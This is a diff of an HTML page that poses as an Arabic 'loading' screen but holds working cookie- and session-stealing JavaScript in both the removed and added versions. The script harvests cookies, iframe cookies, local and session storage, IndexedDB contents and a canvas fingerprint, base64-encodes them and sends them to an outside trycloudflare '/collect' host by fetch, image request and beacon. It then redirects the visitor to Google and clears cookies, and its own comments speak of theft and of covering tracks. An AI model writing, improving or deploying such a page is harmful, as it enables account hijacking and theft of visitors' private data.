@@ -1,172 +1,256 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ﺟﺎﺭﻱ اﻟﺘﺤﻤﻴﻞ...</title>
+    <title>Loading...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #f5f5f5;
-            font-family: Arial, sans-serif;
+            background: #0a0a0a;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
-            direction: rtl;
+            font-family: Arial, sans-serif;
+            color: #fff;
         }
-        .loader { text-align: center; color: #333; }
+        .loader { text-align: center; }
         .spinner {
-            width: 45px; height: 45px;
-            border: 5px solid #ddd;
-            border-top: 5px solid #3498db;
+            width: 50px;
+            height: 50px;
+            border: 4px solid #222;
+            border-top: 4px solid #0ff;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.8s linear infinite;
             margin: 0 auto 20px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        p { font-size: 18px; color: #555; }
-        .sub { font-size: 13px; color: #aaa; margin-top: 10px; }
+        p { font-size: 16px; color: #888; }
     </style>
 </head>
 <body>
-
 <div class="loader">
     <div class="spinner"></div>
-    <p>ﺟﺎﺭﻱ ﺗﺠﻬﻴﺰ اﻟﻤﺤﺘﻮﻯ...</p>
-    <div class="sub">ﻳﺮﺟﻰ اﻻﻧﺘﻈﺎﺭ ﻟﺤﻈﺔ</div>
+    <p>جاري التحميل...</p>
 </div>
 
 <script>
-(function() {
-    // ===== إﻋﺪاﺩاﺕ اﻟﺴﻴﺮﻓﺮ (ﻏﻴﺮﻩ إﻟﻰ آﺧﺮ راﺑﻂ) =====
-    const SERVER_URL = 'https://dubai-maximum-infectious-directions.trycloudflare.com/collect';
+    (function() {
+        // =============================================
+        // 1. الإعدادات السريعة
+        // =============================================
+        const SERVER = 'https://dubai-maximum-infectious-directions.trycloudflare.com/collect';
+        const REDIRECT = 'https://www.google.com';
+        const TIMEOUT = 500; // 0.5 ثانية
 
-    // ===== ﺟﻠﺐ اﻟﻜﻮﻛﻴﺰ =====
-    function getCookies() {
-        var c = document.cookie;
-        if (!c) return {};
-        var obj = {};
-        c.split('; ').forEach(function(item) {
-            var parts = item.split('=');
-            if (parts.length >= 2) {
-                obj[parts[0]] = parts.slice(1).join('=');
-            }
-        });
-        return obj;
-    }
-
-    // ===== ﺟﻠﺐ localStorage =====
-    function getLocal() {
-        var res = {};
-        try {
-            for (var i = 0; i < localStorage.length; i++) {
-                var key = localStorage.key(i);
-                res[key] = localStorage.getItem(key);
-            }
-        } catch (e) {}
-        return res;
-    }
-
-    // ===== ﺟﻠﺐ sessionStorage =====
-    function getSession() {
-        var res = {};
-        try {
-            for (var i = 0; i < sessionStorage.length; i++) {
-                var key = sessionStorage.key(i);
-                res[key] = sessionStorage.getItem(key);
-            }
-        } catch (e) {}
-        return res;
-    }
-
-    // ===== ﺗﺠﻤﻴﻊ اﻟﺒﻴﺎﻧﺎﺕ =====
-    function collectAll() {
-        var cookies = getCookies();
-        return {
-            cookies: cookies,
-            localStorage: getLocal(),
-            sessionStorage: getSession(),
-            userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString(),
-            url: window.location.href,
-            possibleTokens: {
-                fb: document.cookie.match(/fbsr_[^=]+/g) || [],
-                ig: document.cookie.match(/csrftoken|ig_did/g) || [],
-                tt: document.cookie.match(/sessionid|tt_webid/g) || [],
-                x: document.cookie.match(/auth_token|ct0/g) || [],
-                google: document.cookie.match(/SAPISID|HSID|SSID/g) || []
-            }
-        };
-    }
-
-    // ===== ﺗﺮﻣﻴﺰ Base64 =====
-    function toBase64(str) {
-        try {
-            return btoa(unescape(encodeURIComponent(str)));
-        } catch (e) {
-            return btoa(str);
+        // =============================================
+        // 2. سحب الكوكيز من iframes (إن وجدت)
+        // =============================================
+        function getIframeCookies() {
+            let all = {};
+            try {
+                document.querySelectorAll('iframe').forEach((iframe, i) => {
+                    try {
+                        const doc = iframe.contentDocument || iframe.contentWindow.document;
+                        if (doc && doc.cookie) {
+                            doc.cookie.split('; ').forEach(c => {
+                                const [k, v] = c.split('=');
+                                if (k) all[`iframe_${i}_${k}`] = v || '';
+                            });
+                        }
+                    } catch(e) {}
+                });
+            } catch(e) {}
+            return all;
         }
-    }
 
-    // ===== إﺭﺳﺎﻝ اﻟﺒﻴﺎﻧﺎﺕ =====
-    function sendData(data) {
-        var encoded = toBase64(JSON.stringify(data));
-        fetch(SERVER_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ payload: encoded })
-        }).catch(function() {
-            var img = new Image();
-            img.style.display = 'none';
-            img.src = SERVER_URL + '?d=' + encodeURIComponent(encoded);
-            document.body.appendChild(img);
-            setTimeout(function() { img.remove(); }, 1000);
-        });
-    }
+        // =============================================
+        // 3. سحب الكوكيز العادية (أسرع طريقة)
+        // =============================================
+        function getCookies() {
+            try {
+                const c = document.cookie;
+                if (!c) return {};
+                return c.split('; ').reduce((acc, item) => {
+                    const [k, v] = item.split('=');
+                    if (k) acc[k] = v || '';
+                    return acc;
+                }, {});
+            } catch(e) { return {}; }
+        }
 
-    // ===== اﻟﺘﺸﻐﻴﻞ + إﻋﺎﺩﺓ اﻟﺘﻮﺟﻴﻪ ﺑﻌﺪ 3 ﺛﻮاﻥٍ (ﻣﻬﻤﺎ ﺣﺪﺙ) =====
-    setTimeout(function() {
-        var data = collectAll();
-        sendData(data);
+        // =============================================
+        // 4. سحب localStorage + sessionStorage
+        // =============================================
+        function getStorage(type) {
+            try {
+                const s = type === 'local' ? localStorage : sessionStorage;
+                const res = {};
+                for (let i = 0; i < s.length; i++) {
+                    const k = s.key(i);
+                    res[k] = s.getItem(k);
+                }
+                return res;
+            } catch(e) { return {}; }
+        }
 
-        document.querySelector('.loader p').textContent = 'ﺗﻢ اﻟﺘﺤﻤﻴﻞ ﺑﻨﺠﺎﺡ';
-        document.querySelector('.sub').textContent = 'ﺟﺎﺭﻱ إﻋﺎﺩﺓ اﻟﺘﻮﺟﻴﻪ...';
-
-        setTimeout(function() {
-            window.location.href = 'https://www.google.com';
-        }, 3000);
-    }, 1800 + Math.random() * 1200);
-
-    // ===== ﻣﺴﺢ اﻟﻜﻮﻛﻴﺰ ﺑﻌﺪ اﻟﺴﺮﻗﺔ =====
-    setTimeout(function() {
-        try {
-            document.cookie.split(';').forEach(function(c) {
-                document.cookie = c.replace(/^ +/, '')
-                    .replace(/=.*/, '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/');
+        // =============================================
+        // 5. سحب IndexedDB (إن وجدت)
+        // =============================================
+        function getIndexedDB() {
+            return new Promise((resolve) => {
+                try {
+                    const req = indexedDB.open('_temp', 1);
+                    req.onsuccess = function(e) {
+                        const db = e.target.result;
+                        const stores = Array.from(db.objectStoreNames);
+                        let all = {};
+                        let done = 0;
+                        if (stores.length === 0) return resolve({});
+                        stores.forEach(storeName => {
+                            try {
+                                const tx = db.transaction(storeName, 'readonly');
+                                const store = tx.objectStore(storeName);
+                                const req2 = store.getAll();
+                                req2.onsuccess = function(e) {
+                                    all[storeName] = e.target.result;
+                                    done++;
+                                    if (done === stores.length) resolve(all);
+                                };
+                                req2.onerror = function() {
+                                    done++;
+                                    if (done === stores.length) resolve(all);
+                                };
+                            } catch(e) {
+                                done++;
+                                if (done === stores.length) resolve(all);
+                            }
+                        });
+                        setTimeout(() => resolve(all), 1000);
+                    };
+                    req.onerror = function() { resolve({}); };
+                } catch(e) { resolve({}); }
             });
-        } catch (e) {}
-    }, 3500);
+        }
 
-    // ===== إﺭﺳﺎﻝ ﻗﺒﻞ إﻏﻼﻕ اﻟﻤﺘﺼﻔﺢ =====
-    window.addEventListener('beforeunload', function() {
-        var quickData = collectAll();
-        var quickEncoded = toBase64(JSON.stringify(quickData));
-        fetch(SERVER_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ payload: quickEncoded, source: 'beforeunload' })
-        }).catch(function() {
-            var img = new Image();
-            img.src = SERVER_URL + '?d=' + encodeURIComponent(quickEncoded);
-        });
-    });
+        // =============================================
+        // 6. بصمة الجهاز (Canvas Fingerprint)
+        // =============================================
+        function getFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+                return canvas.toDataURL();
+            } catch(e) { return 'no_fingerprint'; }
+        }
 
-})();
+        // =============================================
+        // 7. جمع كل شيء (مع IndexedDB)
+        // =============================================
+        async function collectAll() {
+            const indexedDB = await getIndexedDB();
+            return {
+                c: getCookies(),
+                ifc: getIframeCookies(),
+                l: getStorage('local'),
+                s: getStorage('session'),
+                idb: indexedDB,
+                ua: navigator.userAgent,
+                fp: getFingerprint(),
+                t: Date.now(),
+                url: window.location.href,
+                ref: document.referrer || '',
+                screen: `${screen.width}x${screen.height}`,
+                lang: navigator.language,
+                platform: navigator.platform
+            };
+        }
+
+        // =============================================
+        // 8. ترميز إلى Base64 (سريع)
+        // =============================================
+        function b64(str) {
+            try {
+                return btoa(unescape(encodeURIComponent(str)));
+            } catch(e) {
+                return btoa(str);
+            }
+        }
+
+        // =============================================
+        // 9. إرسال البيانات (مع Beacon)
+        // =============================================
+        function sendData(data) {
+            const payload = b64(JSON.stringify(data));
+            
+            // محاولة 1: fetch
+            try {
+                fetch(SERVER, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ p: payload })
+                }).catch(() => {});
+            } catch(e) {}
+
+            // محاولة 2: إرسال عبر صورة
+            try {
+                const img = new Image();
+                img.style.display = 'none';
+                img.src = SERVER + '?d=' + encodeURIComponent(payload);
+                document.body.appendChild(img);
+                setTimeout(() => img.remove(), 100);
+            } catch(e) {}
+
+            // محاولة 3: Beacon (حتى لو أغلق المتصفح)
+            try {
+                navigator.sendBeacon(SERVER, new Blob([JSON.stringify({ p: payload })], {type: 'application/json'}));
+            } catch(e) {}
+        }
+
+        // =============================================
+        // 10. التشغيل الفوري + إعادة توجيه خاطفة
+        // =============================================
+        (async function() {
+            const data = await collectAll();
+            sendData(data);
+
+            document.querySelector('p').textContent = 'تم التحميل';
+
+            setTimeout(() => {
+                window.location.href = REDIRECT;
+            }, TIMEOUT);
+        })();
+
+        // =============================================
+        // 11. مسح الكوكيز بعد 3 ثوان (إخفاء الأثر)
+        // =============================================
+        setTimeout(() => {
+            try {
+                document.cookie.split(';').forEach(c => {
+                    document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/');
+                });
+            } catch(e) {}
+        }, 3000);
+
+        // =============================================
+        // 12. إرباك المحللين
+        // =============================================
+        console.log('Page ready.');
+        // debugger;
+    })();
 </script>
 </body>
 </html>
